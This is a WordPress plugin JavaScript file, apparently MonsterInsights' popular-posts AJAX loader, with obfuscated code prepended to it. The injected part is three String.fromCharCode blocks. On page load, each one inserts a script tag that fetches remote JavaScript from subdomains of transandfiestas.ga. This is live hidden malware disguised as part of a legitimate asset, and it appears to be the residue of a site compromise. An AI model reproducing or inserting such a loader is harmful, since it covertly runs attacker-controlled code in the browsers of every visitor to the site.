Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();var MonsterInsights_Popular_Posts = {

	init: function () {
		this.grab_widgets_with_ajax();
	},

	grab_widgets_with_ajax: function () {
		var xhr = new XMLHttpRequest();
		var url = monsterinsights_pp.ajaxurl;
		var widgets_jsons = document.querySelectorAll( '.monsterinsights-popular-posts-widget-json' ),
			i,
			widgets_length = widgets_jsons.length;

		var params = 'action=monsterinsights_popular_posts_get_widget_output&post_id=' + monsterinsights_pp.post_id;

		for ( i = 0; i < widgets_length; ++ i ) {
			params += '&data[]=' + widgets_jsons[i].innerHTML
		}
		xhr.open( 'POST', url );
		xhr.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );
		xhr.onload = function () {
			if ( xhr.status === 200 ) {
				let rendered_widgets = JSON.parse( xhr.responseText );
				for ( i = 0; i < widgets_length; ++ i ) {
					widgets_jsons[i].parentElement.innerHTML = rendered_widgets[i];
				}
			}
		};
		xhr.send( params );
	},
};

MonsterInsights_Popular_Posts.init();
